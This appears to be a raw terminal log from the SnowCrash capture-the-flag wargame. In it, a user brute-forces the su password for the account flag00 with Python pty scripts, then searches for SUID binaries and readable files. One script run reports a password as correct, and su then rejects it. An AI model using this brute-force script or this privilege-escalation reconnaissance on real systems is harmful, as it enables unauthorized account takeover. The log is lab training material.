apt install imagemagick-6.q16                  # version 8:6.9.11.60+dfsg-1.6ubuntu1
apt install imagemagick-6.q16hdri              # version 8:6.9.11.60+dfsg-1.6ubuntu1
Ask your administrator to install one of them.
Command 'import' not found, but can be installed with:
apt install graphicsmagick-imagemagick-compat  # version 1.4+really1.3.42-1, or
apt install imagemagick-6.q16                  # version 8:6.9.11.60+dfsg-1.6ubuntu1
apt install imagemagick-6.q16hdri              # version 8:6.9.11.60+dfsg-1.6ubuntu1
Ask your administrator to install one of them.
Command 'import' not found, but can be installed with:
apt install graphicsmagick-imagemagick-compat  # version 1.4+really1.3.42-1, or
apt install imagemagick-6.q16                  # version 8:6.9.11.60+dfsg-1.6ubuntu1
apt install imagemagick-6.q16hdri              # version 8:6.9.11.60+dfsg-1.6ubuntu1
Ask your administrator to install one of them.
Command 'passwords' not found, did you mean:
  command 'passwordz' from snap passwordz (1.0.0)
See 'snap info <snapname>' for additional versions.
g3bw6jm13qvbop8obbg7bebg4b,: command not found
i5dy8lo35sxdqraqddi9dgdi6d,: command not found
k7f0anq57uzfstcsffkbfifk8f,: command not found
m9h2cps79w1huveuhhmdhkhmah,: command not found
obj4eru9by3jwxgwjjofjmjocj,: command not found
qdl6gtwbd05lyziyllqhlolqel,: command not found
sfn8ivydf27n01k0nnsjnqnsgn,: command not found
uhpakx0fh49p23m2ppulpspuip,: command not found
wjrcmz2hj6br45o4rrwnrurwkr,: command not found
ylteo14jl8dt67q6ttyptwtymt,: command not found
0nvgq36lnafv89s8vv0rvyv0ov,: command not found
2pxis58npchxabuaxx2tx0x2qx,: command not found
4rzku7aprejzcdwczz4vz2z4sz,: command not found
6t1mw9crtgl1efye116x1416u1,: command not found
8v3oybetvin3gh0g338z3638w3,: command not found
ax5q0dgvxkp5ij2i55a1585ay5,: command not found
cz7s2fixzmr7kl4k77c37a7c07,: command not found
e19u4hkz1ot9mn6m99e59c9e29: command not found
]: command not found
-bash: syntax error near unexpected token `pid,'
-bash: syntax error near unexpected token `"su",'
else:: command not found
-bash: syntax error near unexpected token `0.1'
-bash: syntax error near unexpected token `('
-bash: syntax error near unexpected token `fd,'
-bash: syntax error near unexpected token `0.2'
-bash: syntax error near unexpected token `('
-bash:  : unrecognized history modifier
-bash: syntax error near unexpected token `fd'
-bash: syntax error near unexpected token `pid,'
level00@snowcrash:~$ python3 -c '
import pty, os, time

passwords = [
    "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",
    "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",
    "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",
    "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",
    "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",
    "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",
    "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",
    "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",
    "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",
    "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",
    "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",
    "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",
    "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",
    "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",
    "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",
    "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",
    "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",
    "e19u4hkz1ot9mn6m99e59c9e29"
]

for pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00")
    else:
        time.sleep(0.05)
        try:
            output = os.read(fd, 1024).decode(errors="ignore")
            os.write(fd, (pwd + "\n").encode())
            time.sleep(0.1)
            res = os.read(fd, 1024).decode(errors="ignore")
            if "failure" not in res.lower() and "incorrect" not in res.lower():
                print("\n[+] PASSWORD CORRECTA:", pwd)
                break
        except Exception:
            pass
        os.close(fd)
        os.waitpid(pid, 0)
'

[+] PASSWORD CORRECTA: g3bw6jm13qvbop8obbg7bebg4b
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ python3 -c '
import pty, os, time

passwords = [
    "f2av5il02puano7naaf6adaf3a",
    "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",
    "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",
    "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",
    "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",
    "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",
    "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",
    "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",
    "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",
    "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",
    "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",
    "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",
    "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",
    "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",
    "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",
    "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",
    "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",
    "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",
    "e19u4hkz1ot9mn6m99e59c9e29"
]

for pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "echo OK_SUCCESS")
    else:
        time.sleep(0.2)
        try:
            os.write(fd, (pwd + "\n").encode())
            time.sleep(0.3)
            out = ""
            while True:
                try:
                    chunk = os.read(fd, 1024).decode(errors="ignore")
                    if not chunk: break
                    out += chunk
                except: break
            if "OK_SUCCESS" in out:
                print(f"\n[!!!] CONTRASEÑA CORRECTA CONFIRMADA: {pwd}")
                break
        except Exception as e:
            pass
        os.close(fd)
        os.waitpid(pid, 0)
'

^C^Clevel00@snowcrash:~$ kill -9 %1
-bash: kill: %1: no such job
level00@snowcrash:~$ python3 -c '
import pty, os, time, select

passwords = [
    "f2av5il02puano7naaf6adaf3a",
    "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",
    "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",
    "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",
    "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",
    "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",
    "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",
    "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",
    "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",
    "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",
    "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",
    "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",
    "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",
    "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",
    "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",
    "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",
    "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",
    "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",
    "e19u4hkz1ot9mn6m99e59c9e29"
]

found = False
for pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "echo SUCCESS_FLAG00")
    else:
        time.sleep(0.1)
        os.write(fd, (pwd + "\n").encode())
        output = ""
        end_time = time.time() + 0.8
        while time.time() < end_time:
            r, _, _ = select.select([fd], [], [], 0.1)
            if r:
                try:
                    data = os.read(fd, 1024).decode(errors="ignore")
                    if not data: break
                    output += data
                except: break
        os.close(fd)
        os.waitpid(pid, 0)
        if "SUCCESS_FLAG00" in output:
            print(f"\n[+] ¡CONTRASEÑA EXACTA ENCONTRADA!: {pwd}")
            found = True
            break

if not found:
    print("\n[-] Ninguna de estas variantes fue aceptada por su.")
'
^Z
[1]+  Stopped                 python3 -c '
import pty, os, time, select

passwords = [
    "f2av5il02puano7naaf6adaf3a",
    "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",
    "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",
    "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",
    "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",
    "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",
    "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",
    "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",
    "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",
    "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",
    "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",
    "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",
    "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",
    "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",
    "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",
    "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",
    "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",
    "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",
    "e19u4hkz1ot9mn6m99e59c9e29"
]

found = False
for pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "echo SUCCESS_FLAG00")
    else:
        time.sleep(0.1)
        os.write(fd, (pwd + "\n").encode())
        output = ""
        end_time = time.time() + 0.8
        while time.time() < end_time:
            r, _, _ = select.select([fd], [], [], 0.1)
            if r:
                try:
                    data = os.read(fd, 1024).decode(errors="ignore")
                    if not data: break
                    output += data
                except: break
        os.close(fd)
        os.waitpid(pid, 0)
        if "SUCCESS_FLAG00" in output:
            print(f"\n[+] ¡CONTRASEÑA EXACTA ENCONTRADA!: {pwd}")
            found = True
            break

if not found:
    print("\n[-] Ninguna de estas variantes fue aceptada por su.")
'
level00@snowcrash:~$ find / -name "*john*" -o -name "*flag00*" 2>/dev/null
/home/flag00
level00@snowcrash:~$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/*" -not -path "/lib/*" 2>/dev/null | grep -E "level00|flag00|john|rodata"
/home/level00/README
/home/level00/.bashrc
/home/level00/.bash_history
/home/level00/.cache/motd.legal-displayed
/home/level00/.bash_logout
/home/level00/.profile
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ cat /home/level00/README
Hiro Protagonist. Last of the freelance hackers. Or so he thinks.
level00@snowcrash:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/opt/snowcrash/level06/raven
/opt/snowcrash/level07/snowcrash
/opt/snowcrash/level09/da5id
/opt/snowcrash/level10/enzo_runner
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ find / -maxdepth 3 -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/*" -not -path "/lib/*" -not -path "/var/*" -readable 2>/dev/null
/
/sbin
/sbin.usr-is-merged
/snap
/snap/README
/run
/run/motd.dynamic
/run/motd.d
/run/motd.d/85-fwupd
/run/sshd.pid
/run/crond.pid
/run/sshd
/run/uuidd
/run/uuidd/request
/run/snapd-snap.socket
/run/snapd.socket
/run/utmp
/run/user
/run/user/1001
/run/screen
/run/setrans
/run/sendsigs.omit.d
/run/shm
/run/dbus
/run/dbus/system_bus_socket
/run/dbus/containers
/run/console-setup
/run/console-setup/font-loaded
/run/console-setup/boot_completed
/run/log
/run/log/journal
/run/tmpfiles.d
/run/tmpfiles.d/static-nodes.conf
/run/mount
/run/cloud-init
/run/cloud-init/disabled
/run/cloud-init/.ds-identify.result
/run/cloud-init/ds-identify.log
/run/cloud-init/cloud-init-generator.log
/run/credentials
/run/systemd
/run/systemd/transient
/run/systemd/generator
/run/systemd/inhibit
/run/systemd/resolve
/run/systemd/timesync
/run/systemd/shutdown
/run/systemd/machines
/run/systemd/users
/run/systemd/sessions
/run/systemd/seats
/run/systemd/netif
/run/systemd/incoming
/run/systemd/journal
/run/systemd/ask-password
/run/systemd/systemd-units-load
/run/systemd/io.systemd.ManagedOOM
/run/systemd/userdb
/run/systemd/notify
/run/systemd/network
/run/systemd/show-status
/run/systemd/units
/run/systemd/propagate
/run/systemd/inaccessible
/run/systemd/mount-rootfs
/run/systemd/system
/run/lock
/run/lock/subsys
/run/network
/run/network/dynamic-interfaces
/run/blkid
/run/blkid/blkid.tab
/run/udev
/run/udev/static_node-tags
/run/udev/watch
/run/udev/rules.d
/run/udev/links
/run/udev/tags
/run/udev/data
/usr
/boot
/boot/config-6.8.0-124-generic
/boot/initrd.img
/boot/initrd.img-6.8.0-124-generic
/boot/initrd.img.old
/boot/grub
/boot/grub/i386-pc
/boot/grub/unicode.pf2
/boot/grub/fonts
/boot/grub/gfxblacklist.txt
/boot/grub/locale
/boot/grub/grubenv
/lib64
/proc
/bin
/dev
/dev/dri
/dev/dri/by-path
/dev/dri/card0
/dev/dri/renderD128
/dev/snd
/dev/snd/seq
/dev/snd/timer
/dev/vfio
/dev/vfio/vfio
/dev/cpu
/dev/cpu/1
/dev/cpu/0
/dev/mqueue
/dev/hugepages
/dev/log
/dev/shm
/dev/shm/ng_channel
/dev/autofs
/dev/block
/dev/disk
/dev/disk/by-uuid
/dev/disk/by-partuuid
/dev/disk/by-path
/dev/disk/by-id
/dev/disk/by-diskseq
/dev/char
/dev/char/226:0
/dev/char/13:0
/dev/char/226:128
/dev/char/10:200
/dev/char/10:242
/dev/char/10:229
/dev/char/10:235
/dev/char/1:9
/dev/char/1:5
/dev/char/1:8
/dev/char/1:11
/dev/char/1:3
/dev/char/1:7
/dev/char/4:1
/dev/char/5:2
/dev/char/5:0
/dev/pts
/dev/pts/1
/dev/pts/0
/dev/stderr
/dev/stdout
/dev/stdin
/dev/fd
/dev/bsg
/dev/mapper
/dev/input
/dev/input/js0
/dev/input/by-path
/dev/net
/dev/net/tun
/dev/dma_heap
/dev/ptmx
/dev/fuse
/dev/tty1
/dev/tty
/dev/kmsg
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/null
/dev/rfkill
/sys
/var
/mnt
/tmp
/tmp/kourier_delivery.tmp
/tmp/.XIM-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.ICE-unix
/lib
/cdrom
/bin.usr-is-merged
/home
/home/level00
/home/level00/README
/home/level00/.bashrc
/home/level00/.bash_history
/home/level00/.cache
/home/level00/.bash_logout
/home/level00/.profile
/etc
/etc/.resolv.conf.systemd-resolved.bak
/etc/polkit-1
/etc/ModemManager
/etc/ModemManager/connection.d
/etc/ModemManager/fcc-unlock.d
/etc/UPower
/etc/UPower/UPower.conf
/etc/rc6.d
/etc/rc6.d/K01unattended-upgrades
/etc/rc6.d/K01plymouth
/etc/rc6.d/K01uuidd
/etc/rc6.d/K01open-vm-tools
/etc/rc6.d/K01open-iscsi
/etc/rc6.d/K01cryptdisks-early
/etc/rc6.d/K01cryptdisks
/etc/rc6.d/K01iscsid
/etc/bash_completion.d
/etc/bash_completion.d/git-prompt
/etc/netconfig
/etc/libibverbs.d
/etc/libibverbs.d/ocrdma.driver
/etc/libibverbs.d/qedr.driver
/etc/libibverbs.d/mthca.driver
/etc/libibverbs.d/hfi1verbs.driver
/etc/libibverbs.d/vmw_pvrdma.driver
/etc/libibverbs.d/efa.driver
/etc/libibverbs.d/erdma.driver
/etc/libibverbs.d/mlx4.driver
/etc/libibverbs.d/rxe.driver
/etc/libibverbs.d/ipathverbs.driver
/etc/libibverbs.d/cxgb4.driver
/etc/libibverbs.d/siw.driver
/etc/libibverbs.d/bnxt_re.driver
/etc/libibverbs.d/mlx5.driver
/etc/libibverbs.d/irdma.driver
/etc/libibverbs.d/mana.driver
/etc/libibverbs.d/hns.driver
/etc/subgid
/etc/netplan
/etc/vim
/etc/vim/vimrc.tiny
/etc/vim/vimrc
/etc/nanorc
/etc/profile.d
/etc/profile.d/apps-bin-path.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/gawk.sh
/etc/profile.d/Z97-byobu.sh
/etc/profile.d/Z99-cloudinit-warnings.sh
/etc/profile.d/Z99-cloud-locale-test.sh
/etc/profile.d/01-locale-fix.sh
/etc/profile.d/gawk.csh
/etc/lsb-release
/etc/issue
/etc/sudo_logsrvd.conf
/etc/systemd
/etc/systemd/system
/etc/systemd/resolved.conf
/etc/systemd/system.conf
/etc/systemd/journald.conf
/etc/systemd/user
/etc/systemd/networkd.conf
/etc/systemd/system-generators
/etc/systemd/timesyncd.conf
/etc/systemd/sleep.conf
/etc/systemd/user.conf
/etc/systemd/logind.conf
/etc/systemd/network
/etc/systemd/pstore.conf
/etc/group
/etc/timezone
/etc/needrestart
/etc/needrestart/needrestart.conf
/etc/needrestart/notify.conf
/etc/needrestart/hook.d
/etc/needrestart/restart.d
/etc/needrestart/conf.d
/etc/needrestart/notify.d
/etc/needrestart/iucode.sh
/etc/ssh
/etc/ssh/ssh_host_ed25519_key.pub
/etc/ssh/sshd_config.2236.2026-06-09@19:02:50~
/etc/ssh/ssh_host_ecdsa_key.pub
/etc/ssh/ssh_host_rsa_key.pub
/etc/ssh/sshd_config.2184.2026-06-09@19:02:49~
/etc/ssh/ssh_config.d
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/ssh/moduli
/etc/ssh/sshd_config.d
/etc/ssh/sshd_config.2158.2026-06-09@19:02:49~
/etc/ssh/sshd_config.2210.2026-06-09@19:02:50~
/etc/ssh/ssh_import_id
/etc/ld.so.cache
/etc/alternatives
/etc/alternatives/lzgrep.1.gz
/etc/alternatives/iptables
/etc/alternatives/view
/etc/alternatives/ip6tables-save
/etc/alternatives/ip6tables
/etc/alternatives/editor.1.gz
/etc/alternatives/iptables-save
/etc/alternatives/nc.1.gz
/etc/alternatives/lzcat.1.gz
/etc/alternatives/telnet.1.gz
/etc/alternatives/vim
/etc/alternatives/rvim
/etc/alternatives/ex
/etc/alternatives/lzcmp.1.gz
/etc/alternatives/nawk.1.gz
/etc/alternatives/c89
/etc/alternatives/mt
/etc/alternatives/which
/etc/alternatives/iptables-restore
/etc/alternatives/ftp.1.gz
/etc/alternatives/editor
/etc/alternatives/ftp
/etc/alternatives/cpp
/etc/alternatives/vi.pl.1.gz
/etc/alternatives/infobrowser
/etc/alternatives/lzma.1.gz
/etc/alternatives/fakeroot
/etc/alternatives/lzma
/etc/alternatives/fakeroot.es.1.gz
/etc/alternatives/rview
/etc/alternatives/view.ja.1.gz
/etc/alternatives/which.ja1.gz
/etc/alternatives/pybabel
/etc/alternatives/ex.da.1.gz
/etc/alternatives/arptables
/etc/alternatives/which.sl1.gz
/etc/alternatives/ex.tr.1.gz
/etc/alternatives/ex.ru.1.gz
/etc/alternatives/which.fr1.gz
/etc/alternatives/lzmore.1.gz
/etc/alternatives/ex.1.gz
/etc/alternatives/nc
/etc/alternatives/faked.1.gz
/etc/alternatives/ex.de.1.gz
/etc/alternatives/ip6tables-restore
/etc/alternatives/view.it.1.gz
/etc/alternatives/lzgrep
/etc/alternatives/arptables-save
/etc/alternatives/builtins.7.gz
/etc/alternatives/telnet
/etc/alternatives/pinentry.1.gz
/etc/alternatives/pico.1.gz
/etc/alternatives/which.de1.gz
/etc/alternatives/README
/etc/alternatives/newt-palette
/etc/alternatives/which.1.gz
/etc/alternatives/infobrowser.1.gz
/etc/alternatives/pico
/etc/alternatives/lzmore
/etc/alternatives/rmt.8.gz
/etc/alternatives/fakeroot.fr.1.gz
/etc/alternatives/vtrgb
/etc/alternatives/pinentry
/etc/alternatives/which.it1.gz
/etc/alternatives/faked.es.1.gz
/etc/alternatives/lzdiff
/etc/alternatives/faked.sv.1.gz
/etc/alternatives/c++
/etc/alternatives/text.plymouth
/etc/alternatives/vi.ru.1.gz
/etc/alternatives/vi.it.1.gz
/etc/alternatives/arptables-restore
/etc/alternatives/view.pl.1.gz
/etc/alternatives/lzegrep.1.gz
/etc/alternatives/fakeroot.sv.1.gz
/etc/alternatives/view.da.1.gz
/etc/alternatives/lzfgrep.1.gz
/etc/alternatives/cc
/etc/alternatives/ex.it.1.gz
/etc/alternatives/vi.fr.1.gz
/etc/alternatives/lzdiff.1.gz
/etc/alternatives/view.1.gz
/etc/alternatives/ex.ja.1.gz
/etc/alternatives/c++.1.gz
/etc/alternatives/view.ru.1.gz
/etc/alternatives/nawk
/etc/alternatives/ex.pl.1.gz
/etc/alternatives/view.fr.1.gz
/etc/alternatives/netcat
/etc/alternatives/vimdiff
/etc/alternatives/lzless
/etc/alternatives/pager
/etc/alternatives/ebtables-restore
/etc/alternatives/c99.1.gz
/etc/alternatives/view.tr.1.gz
/etc/alternatives/faked.fr.1.gz
/etc/alternatives/unlzma.1.gz
/etc/alternatives/sar
/etc/alternatives/cc.1.gz
/etc/alternatives/unlzma
/etc/alternatives/vi.tr.1.gz
/etc/alternatives/awk
/etc/alternatives/view.de.1.gz
/etc/alternatives/c89.1.gz
/etc/alternatives/lzcat
/etc/alternatives/vi
/etc/alternatives/vi.de.1.gz
/etc/alternatives/vi.ja.1.gz
/etc/alternatives/lzegrep
/etc/alternatives/ebtables
/etc/alternatives/ebtables-save
/etc/alternatives/which.es1.gz
/etc/alternatives/awk.1.gz
/etc/alternatives/sar.1.gz
/etc/alternatives/vi.1.gz
/etc/alternatives/lzcmp
/etc/alternatives/ex.fr.1.gz
/etc/alternatives/mt.1.gz
/etc/alternatives/c99
/etc/alternatives/rmt
/etc/alternatives/lzfgrep
/etc/alternatives/pager.1.gz
/etc/alternatives/fakeroot.1.gz
/etc/alternatives/which.pl1.gz
/etc/alternatives/vi.da.1.gz
/etc/alternatives/jsondiff
/etc/alternatives/netcat.1.gz
/etc/alternatives/lzless.1.gz
/etc/wgetrc
/etc/security
/etc/security/pam_env.conf
/etc/security/faillock.conf
/etc/security/namespace.d
/etc/security/time.conf
/etc/security/group.conf
/etc/security/limits.conf
/etc/security/namespace.conf
/etc/security/capability.conf
/etc/security/sepermit.conf
/etc/security/limits.d
/etc/security/access.conf
/etc/security/namespace.init
/etc/security/pwhistory.conf
/etc/sysctl.d
/etc/sysctl.d/10-kernel-hardening.conf
/etc/sysctl.d/10-ipv6-privacy.conf
/etc/sysctl.d/10-ptrace.conf
/etc/sysctl.d/10-magic-sysrq.conf
/etc/sysctl.d/README.sysctl
/etc/sysctl.d/10-zeropage.conf
/etc/sysctl.d/10-network-security.conf
/etc/sysctl.d/99-sysctl.conf
/etc/sysctl.d/10-console-messages.conf
/etc/sysctl.d/10-map-count.conf
/etc/sysctl.d/10-bufferbloat.conf
/etc/fstab
/etc/gai.conf
/etc/rc3.d
/etc/rc3.d/S01rsync
/etc/rc3.d/S01open-vm-tools
/etc/rc3.d/S01ssh
/etc/rc3.d/S01console-setup.sh
/etc/rc3.d/S01plymouth
/etc/rc3.d/K01unattended-upgrades
/etc/rc3.d/S01grub-common
/etc/rc3.d/S01uuidd
/etc/rc3.d/S01sysstat
/etc/rc3.d/S01dbus
/etc/rc3.d/S01cron
/etc/rc3.d/S01apport
/etc/mime.types
/etc/ld.so.conf.d
/etc/ld.so.conf.d/libc.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/vmware-tools
/etc/vmware-tools/vgauth
/etc/vmware-tools/statechange.subr
/etc/vmware-tools/poweroff-vm-default
/etc/vmware-tools/resume-vm-default
/etc/vmware-tools/tools.conf
/etc/vmware-tools/vgauth.conf
/etc/vmware-tools/tools.conf.example
/etc/vmware-tools/scripts
/etc/vmware-tools/poweron-vm-default
/etc/vmware-tools/suspend-vm-default
/etc/xattr.conf
/etc/magic.mime
/etc/rc1.d
/etc/rc1.d/K01uuidd
/etc/rc1.d/K01open-vm-tools
/etc/rc1.d/K01ufw
/etc/rc1.d/K01open-iscsi
/etc/rc1.d/K01iscsid
/etc/kernel
/etc/kernel/postinst.d
/etc/kernel/install.d
/etc/kernel/postrm.d
/etc/kernel/preinst.d
/etc/pam.conf
/etc/ldap
/etc/ldap/ldap.conf
/etc/udev
/etc/udev/udev.conf
/etc/udev/iocost.conf
/etc/udev/rules.d
/etc/udev/hwdb.d
/etc/magic
/etc/resolv.conf
/etc/environment
/etc/issue.net
/etc/mke2fs.conf
/etc/passwd
/etc/selinux
/etc/selinux/semanage.conf
/etc/locale.conf
/etc/nftables.conf
/etc/sensors3.conf
/etc/hosts
/etc/apparmor
/etc/apparmor/parser.conf
/etc/terminfo
/etc/terminfo/README
/etc/PackageKit
/etc/PackageKit/Vendor.conf
/etc/PackageKit/PackageKit.conf
/etc/cron.yearly
/etc/cron.yearly/.placeholder
/etc/perl
/etc/perl/Net
/etc/debconf.conf
/etc/hostname
/etc/debian_version
/etc/ld.so.conf
/etc/update-manager
/etc/update-manager/meta-release
/etc/update-manager/release-upgrades.d
/etc/update-manager/release-upgrades
/etc/modules-load.d
/etc/modules-load.d/modules.conf
/etc/profile
/etc/gss
/etc/gss/mech.d
/etc/hosts.deny
/etc/pam.d
/etc/pam.d/chfn
/etc/pam.d/cron
/etc/pam.d/runuser-l
/etc/pam.d/vmtoolsd
/etc/pam.d/chpasswd
/etc/pam.d/other
/etc/pam.d/passwd
/etc/pam.d/sudo-i
/etc/pam.d/runuser
/etc/pam.d/common-account
/etc/pam.d/sudo
/etc/pam.d/common-auth
/etc/pam.d/common-password
/etc/pam.d/common-session
/etc/pam.d/chsh
/etc/pam.d/su-l
/etc/pam.d/login
/etc/pam.d/common-session-noninteractive
/etc/pam.d/newusers
/etc/pam.d/sshd
/etc/pam.d/su
/etc/modules
/etc/cron.hourly
/etc/cron.hourly/.placeholder
/etc/usb_modeswitch.conf
/etc/multipath.conf
/etc/locale.alias
/etc/rpc
/etc/sos
/etc/sos/sos.conf
/etc/sos/extras.d
/etc/sos/cleaner
/etc/sos/presets.d
/etc/sos/groups.d
/etc/rc4.d
/etc/rc4.d/S01rsync
/etc/rc4.d/S01open-vm-tools
/etc/rc4.d/S01ssh
/etc/rc4.d/S01console-setup.sh
/etc/rc4.d/S01plymouth
/etc/rc4.d/K01unattended-upgrades
/etc/rc4.d/S01grub-common
/etc/rc4.d/S01uuidd
/etc/rc4.d/S01sysstat
/etc/rc4.d/S01dbus
/etc/rc4.d/S01cron
/etc/rc4.d/S01apport
/etc/subgid-
/etc/plymouth
/etc/mtab
/etc/subuid-
/etc/logcheck
/etc/logcheck/ignore.d.server
/etc/logcheck/violations.d
/etc/apport
/etc/apport/crashdb.conf
/etc/apport/report-ignore
/etc/fonts
/etc/fonts/conf.avail
/etc/fonts/fonts.conf
/etc/fonts/conf.d
/etc/gprofng.rc
/etc/ubuntu-advantage
/etc/ubuntu-advantage/uaclient.conf
/etc/udisks2
/etc/udisks2/udisks2.conf
/etc/udisks2/mount_options.conf.example
/etc/rc5.d
/etc/rc5.d/S01rsync
/etc/rc5.d/S01open-vm-tools
/etc/rc5.d/S01ssh
